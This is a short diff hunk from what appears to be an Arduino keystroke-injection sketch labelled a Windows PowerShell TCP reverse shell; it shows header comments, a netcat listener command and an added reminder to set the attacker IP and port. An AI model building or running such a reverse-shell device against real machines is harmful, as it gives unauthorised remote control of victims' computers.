@@ -4,6 +4,7 @@
 // Windows Reverse-Shell TCP PS
 // Tested on Windows 10
 // Listener: nc -lnvp 6666
+// CHANGE TARGET IN URL LINE 37 !!!!! ip=YOURIP -d port=YOURPORT
 
 #include "Keyboard.h"
  
